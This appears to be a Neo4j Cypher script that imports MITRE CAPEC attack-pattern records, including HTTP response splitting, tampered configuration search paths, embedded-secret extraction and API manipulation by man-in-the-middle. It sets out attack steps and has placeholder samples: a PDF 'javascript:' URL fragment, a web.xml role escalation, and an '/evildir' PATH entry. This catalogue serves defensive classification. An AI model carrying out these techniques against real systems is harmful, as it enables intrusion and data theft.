CREATE (:ResourcesRequired{id: 197, text: "<div level=\"0\">\n  <p class=\"text\">A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, \"Port Unreachable..</p>\n</div>"});
CREATE (:AttackPattern{id: 34, name: "HTTP Response Splitting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 285, text: "<div level=\"0\">\n  <p class=\"text\">User-controlled input used as part of HTTP header</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 286, text: "<div level=\"0\">\n  <p class=\"text\">Ability of attacker to inject custom strings in HTTP header</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 287, text: "<div level=\"0\">\n  <p class=\"text\">Insufficient input validation in application to check for input sanity before using it as part of response header</p>\n</div>"});
CREATE (:Submission{id: 317});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 311, summary: "OrderedDict([('Text', ['This attack uses a maliciously-crafted HTTP request in order to cause a vulnerable web server to respond with an HTTP response stream that will be interpreted by the client as two separate responses instead of one. This is possible when user-controlled input is used unvalidated as part of the response headers. The target software, the client, will interpret the injected header as being a response to a second request, thereby causing the maliciously-crafted contents be displayed and possibly cached.', 'To achieve HTTP Response Splitting on a vulnerable web server, the attacker:'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Spider", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links, the forms and all potential user-controllable input points for the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL, forms found in the pages (like file upload, etc.).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inputs are transported through HTTP</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application uses redirection techniques (HTTP Location, etc.)</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 5, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of user-controllable input entry points is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt variations on input parameters", description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects the entry points identified in the Explore Phase with response splitting syntax and variations of payloads to be acted on in the additional response. He records all the responses from the server that include unmodified versions of his payload.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use CR\\LF characters (encoded or not) in the payloads in order to see if the HTTP header can be split.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record the HTTP responses headers.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The web server uses unvalidated user-controlled input as part of the response headers</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The CR\\LF characters are passed in the HTTP header and two responses are generated for a single request."});
CREATE (:Outcome{id: 2, type: "Failure", description: "All CR\\LF characters are consistently re-encoded or stripped before being written in the HTTP header"});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "The size of the payload is being limited by the server-side application."});
CREATE (:Outcome{id: 4, type: "Inconclusive", description: "Some sensitive characters are consistently encoded, but others are not."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Cross-Site Scripting", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he can choose to attack the user with Cross-Site Scripting. The possible outcomes of such an attack are described in the Cross-Site Scripting related attack patterns.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Inject cross-site scripting payload preceded by response splitting syntax (CR/LF) into user-controllable input identified as vulnerable in the Experiment Phase.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The malicious script is executed within the user's context."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Cache poisoning", description: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker decides to target the cache server by forging new responses. The server will then cache the second request and response. The cached response has most likely an attack vector like Cross-Site Scripting; this attack will then be serve to many clients due to the caching system.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">System performs caching of HTTP responses</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the users to be served with this cached malicious HTTP response."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.34.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.34.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-113 - HTTP Response Splitting", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/113.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.34.3", title: "Common Weakness Enumeration (CWE)", section: "CWE-74 - Injection", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/74.html"});
MERGE (:CWE{id: 113});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
MERGE (:CWE{id: 713});
MERGE (:CWE{id: 74});
CREATE (:ResourcesRequired{id: 198, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 35, name: "Leverage Executable Code in Non-Executable Files", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 288, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have the ability to modify non-executable files consumed by the target software.</p>\n</div>"});
CREATE (:Submission{id: 318});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 251});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 312, summary: "OrderedDict([('Text', [\"An attack of this type exploits a system's trust in configuration and resource files, when the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.\", 'The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser. Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/)', 'http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here', \"The client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process.\", 'The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name \"public\" grants all users with the public role the ability to use the administration functionality.', 'The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control.']), ('Block', OrderedDict([('Code', ['< security-constraint>', '</security-constraint>']), ('Block', OrderedDict([('Code', ['<description>Security processing rules for admin screens</description>', '<url-pattern>/admin/*</url-pattern>', '<http-method>POST</http-method>', '<http-method>GET</http-method>']), ('Block', OrderedDict([('Code', ['<auth-constraint>', '</auth-constraint>']), ('Block', OrderedDict([('Code', ['<role-name>administrator</role-name>', '<role-name>public</role-name>'])]))]))]))]))])"});
MERGE (:Reference{id: "REF-2", local_id: "R.35.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
CREATE (:CVE{id: "CVE-2004-0200"});
MERGE (:CWE{id: 94});
MERGE (:CWE{id: 96});
MERGE (:CWE{id: 95});
MERGE (:CWE{id: 97});
MERGE (:CWE{id: 272});
MERGE (:CWE{id: 59});
MERGE (:CWE{id: 282});
MERGE (:CWE{id: 275});
MERGE (:CWE{id: 264});
MERGE (:CWE{id: 270});
MERGE (:CWE{id: 714});
CREATE (:ResourcesRequired{id: 199, text: "<div level=\"0\">\n  <p class=\"text\">Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</p>\n</div>"});
CREATE (:AttackPattern{id: 36, name: "Using Unpublished APIs", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 289, text: "<div level=\"0\">\n  <p class=\"text\">The architecture under attack must publish or otherwise make available services that clients can attach to, either in an unauthenticated fashion, or having obtained an authentication token elsewhere. The service need not be 'discoverable', but in the event it isn't it must have some way of being discovered by an attacker. This might include listening on a well-known port. Ultimately, the likelihood of exploit depends on discoverability of the vulnerable service.</p>\n</div>"});
CREATE (:Submission{id: 319});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 252});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Phases, Attack_Prerequisites, Description Summary"});
CREATE (:PreviousEntryName{id: 68, name: "Using Unpublished Web Service APIs"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 313, summary: "OrderedDict([('Text', 'An adversary searches for and invokes APIs that the target system designers did not intend to be publicly available. If these APIs fail to authenticate requests the attacker may be able to invoke functionality they are not authorized for.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Discover a service of interest by exploring service registry listings or by connecting on a known port or some similar means.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Authenticate to the service, if required, in order to explore it.</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Determine the exposed interfaces by querying the registry as well as probably sniffing to expose interfaces that are not explicitly listed.</p>\n</div>"});
MERGE (:CWE{id: 306});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 695});
CREATE (:ResourcesRequired{id: 200, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required in order to conduct these attacks. Web service digging tools may be helpful.</p>\n</div>"});
CREATE (:AttackPattern{id: 37, name: "Retrieve Embedded Sensitive Data", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 290, text: "<div level=\"0\">\n  <p class=\"text\">In order to feasibly execute this type of attack, some valuable data must be present in client software.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 291, text: "<div level=\"0\">\n  <p class=\"text\">Additionally, this information must be unprotected, or protected in a flawed fashion, or through a mechanism that fails to resist reverse engineering, statistical, or other attack.</p>\n</div>"});
CREATE (:Submission{id: 320});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 253});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required"});
CREATE (:PreviousEntryName{id: 69, name: "Lifting Data Embedded in Client Distributions"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 314, summary: "OrderedDict([('Text', 'An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Identify Target", description: "<div level=\"0\">\n  <p class=\"text\">Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Proprietary or sensitive data is stored in a location ultimately distributed to end users.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Access to binary code is not realistic. For example, in a client-server environment, binary code on the server is presumed to be inscrutable to an attacker unless another vulnerability exposes it.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker identifies one or more files in the system to examine."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Apply mining techniques", description: "<div level=\"0\">\n  <p class=\"text\">The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to extract the information of interest.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, he attempts decoding in that format.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Well known data types are used and embedded inside the client-accessible code.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Proprietary data encodings are used. Although this incrementally increases the difficulty for an attacker to decode the data, it provides no better protection than well-known data types. Since few software developers are trained in obfuscation and cryptography, most proprietary encodings add little security value.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker extracts useful information."});
CREATE (:SecurityControl{id: 1, type: "Corrective"});
CREATE (:CVE{id: "CVE-2010-0557", description: "<div level=\"0\">\n  <p class=\"text\">IBM Cognos Express 9.0 allows attackers to obtain unspecified access to the Tomcat Manager component, and cause a denial of service, by leveraging hardcoded credentials.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2009-1472", description: "<div level=\"0\">\n  <p class=\"text\">The Java client program for the ATEN KH1516i IP KVM switch with firmware 1.0.063 and the KN9116 IP KVM switch with firmware 1.1.104 has a hardcoded AES encryption key, which makes it easier for man-in-the-middle attackers to (1) execute arbitrary Java code, or (2) gain access to machines connected to the switch, by hijacking a session.</p>\n</div>"});
MERGE (:CWE{id: 311});
MERGE (:CWE{id: 525});
MERGE (:CWE{id: 312});
MERGE (:CWE{id: 314});
MERGE (:CWE{id: 315});
MERGE (:CWE{id: 318});
CREATE (:ResourcesRequired{id: 201, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as \"Strings\" or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources.</p>\n</div>"});
CREATE (:AttackPattern{id: 38, name: "Leveraging/Manipulating Configuration File Search Paths", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 292, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to write to redirect search paths on the victim host.</p>\n</div>"});
CREATE (:Submission{id: 321});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 315, summary: "OrderedDict([('Text', [\"This attack loads a malicious resource into a program's standard path used to bootstrap and/or provide contextual information for a program like a path variable or classpath. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.\", 'A standard UNIX path looks similar to this', \"If the attacker modifies the path variable to point to a locale that includes malicious resources then the user unwittingly can execute commands on the attackers' behalf:\", 'This is a form of usurping control of the program and the attack can be done on the classpath, database resources, or any other resources built from compound parts. At runtime detection and blocking of this attack is nearly impossible, because the configuration allows execution.']), ('Block', [OrderedDict([('Code', '/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin')]), OrderedDict([('Code', '/evildir/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin')])])])"});
MERGE (:Reference{id: "REF-2", local_id: "R.38.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 426});
MERGE (:CWE{id: 427});
MERGE (:CWE{id: 428});
MERGE (:CWE{id: 706});
CREATE (:AttackPattern{id: 383, name: "Harvesting Usernames or UserIDs via Application API Event Monitoring", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 293, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software is utilizing application framework APIs</p>\n</div>"});
CREATE (:Submission{id: 322});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 316, summary: "OrderedDict([('Text', 'An attacker hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the attacker creating an event within the sub-application. Assume the attacker hosts a \"virtual sale\" of rare items. As other users enter the event, the attacker records via MITM proxy the user_ids and usernames of everyone who attends. The attacker would then be able to spam those users within the application using an automated script.')])"});
MERGE (:Reference{id: "REF-25", local_id: "R.383.1", author: "['Tom Stracener', 'Sean Barnum']", title: "So Many Ways [...]: Exploiting Facebook and YoVille", publisher: "Defcon 18", pubdate: "2010"});
MERGE (:CWE{id: 311});
MERGE (:CWE{id: 319});
MERGE (:CWE{id: 419});
MERGE (:CWE{id: 602});
CREATE (:ResourcesRequired{id: 203, text: "<div level=\"0\">\n  <p class=\"text\">A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</p>\n</div>"});
CREATE (:AttackPattern{id: 384, name: "Application API Message Manipulation via Man-in-the-Middle", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 294, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software is utilizing application framework APIs</p>\n</div>"});
CREATE (:Submission{id: 323});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 317, summary: "OrderedDict([('Text', 'An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system. Despite the use of MITM software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true \"Man-in-the-Middle\" attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.')])"});
MERGE (:Reference{id: "REF-25", local_id: "R.384.1", author: "['Tom Stracener', 'Sean Barnum']", title: "So Many Ways [...]: Exploiting Facebook and YoVille", publisher: "Defcon 18", pubdate: "2010"});
MERGE (:CWE{id: 471});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 204, text: "<div level=\"0\">\n  <p class=\"text\">A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</p>\n</div>"});
CREATE (:AttackPattern{id: 385, name: "Transaction or Event Tampering via Application API Manipulation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 295, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software is utilizing application framework APIs</p>\n</div>"});
CREATE (:Submission{id: 324});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 318, summary: "OrderedDict([('Text', 'An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.')])"});
MERGE (:Reference{id: "REF-25", local_id: "R.385.1", author: "['Tom Stracener', 'Sean Barnum']", title: "So Many Ways [...]: Exploiting Facebook and YoVille", publisher: "Defcon 18", pubdate: "2010"});
MERGE (:CWE{id: 471});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 205, text: "<div level=\"0\">\n  <p class=\"text\">A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</p>\n</div>"});
CREATE (:AttackPattern{id: 386, name: "Application API Navigation Remapping", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 296, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software is utilizing application framework APIs</p>\n</div>"});
CREATE (:Submission{id: 325});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 319, summary: "OrderedDict([('Text', \"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.\")])"});
MERGE (:Reference{id: "REF-25", local_id: "R.386.1", author: "['Tom Stracener', 'Sean Barnum']", title: "So Many Ways [...]: Exploiting Facebook and YoVille", publisher: "Defcon 18", pubdate: "2010"});
MERGE (:CWE{id: 471});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 206, text: "<div level=\"0\">\n  <p class=\"text\">A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</p>\n</div>"});
CREATE (:AttackPattern{id: 387, name: "Navigation Remapping To Propagate Malicious Content", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 297, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software is utilizing application framework APIs</p>\n</div>"});
CREATE (:Submission{id: 326});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 320, summary: "OrderedDict([('Text', \"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the destination of various application interface elements.\")])"});
MERGE (:Reference{id: "REF-25", local_id: "R.387.1", author: "['Tom Stracener', 'Sean Barnum']", title: "So Many Ways [...]: Exploiting Facebook and YoVille", publisher: "Defcon 18", pubdate: "2010"});
MERGE (:CWE{id: 471});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 207, text: "<div level=\"0\">\n  <p class=\"text\">A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</p>\n</div>"});
CREATE (:AttackPattern{id: 388, name: "Application API Button Hijacking", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 298, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software is utilizing application framework APIs</p>\n</div>"});
CREATE (:Submission{id: 327});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 321, summary: "OrderedDict([('Text', ['An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination. For example, an in-game event occurs and the attacker traps the result, which turns out to be a form that will be populated to their primary profile. The attacker, using a MITM proxy, observes the following data:', 'By altering the destination of \"Claim_Link\" to point to the attackers\\' server an unwitting victim can be enticed to click the link. Another example would be for the attacker to rewrite the button destinations for an event so that clicking \"Yes\" or \"No\" causes the user to load the attackers\\' code.']), ('Block', OrderedDict([('Code', '[Button][Claim_Item]Sourdough_Cookie[URL_IMG]foo[/URL_IMG][Claim_Link]bar[/Claim_Link]')]))])"});
MERGE (:Reference{id: "REF-25", local_id: "R.388.1", author: "['Tom Stracener', 'Sean Barnum']", title: "So Many Ways [...]: Exploiting Facebook and YoVille", publisher: "Defcon 18", pubdate: "2010"});
MERGE (:CWE{id: 471});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 208, text: "<div level=\"0\">\n  <p class=\"text\">A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</p>\n</div>"});
CREATE (:AttackPattern{id: 389, name: "Content Spoofing Via Application API Manipulation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 299, text: "<div level=\"0\">\n  <p class=\"text\">Targeted software is utilizing application framework APIs</p>\n</div>"});
CREATE (:Submission{id: 328});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
